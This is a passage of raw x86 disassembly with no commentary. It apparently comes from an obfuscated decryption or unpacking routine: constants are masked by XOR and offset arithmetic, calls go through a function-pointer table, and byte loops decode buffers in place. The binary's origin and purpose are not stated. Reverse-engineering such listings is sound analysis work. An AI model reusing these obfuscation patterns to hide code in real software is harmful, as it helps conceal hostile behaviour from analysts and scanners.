  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
